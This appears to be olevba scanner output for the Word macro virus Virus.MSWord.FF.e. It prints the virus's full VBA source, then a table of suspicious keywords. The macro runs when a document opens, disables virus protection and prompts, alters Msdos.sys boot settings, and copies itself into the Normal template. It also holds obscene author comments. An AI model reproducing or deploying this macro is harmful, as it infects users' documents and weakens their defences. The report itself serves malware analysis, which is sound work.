olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FF.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FF.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_Open(): On Error Resume Next: Options.ConfirmConversions = (0 - 0): Options.SaveNormalPrompt = (1 - 1): Options.VirusProtection = (2 - 2): CommandBars("Tools").Controls("Macro").Delete
If Day(1) Then: SetAttr "C:\Msdos.sys", vbNormal: System.PrivateProfileString("C:\Msdos.sys", "Options", "BootGUI") = "0": SetAttr "C:\Msdos.sys", vbSystem + vbHidden + vbReadOnly
Open "C:\FF.sys" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\FF.sys"): ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\FF.sys"): ActiveDocument.SaveAs FileName = ActiveDocument.FullName: End Sub
'*;*;*;*;*;*;*;*;*;*;*;*;*;*'
'*~FistFuck:~By~Lys~KovicK~*'
'*~Enjoy~The~HandJob~Bitch~*'
'*'*'*'*'*'*'*'*'*'*'*'*'*'*'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

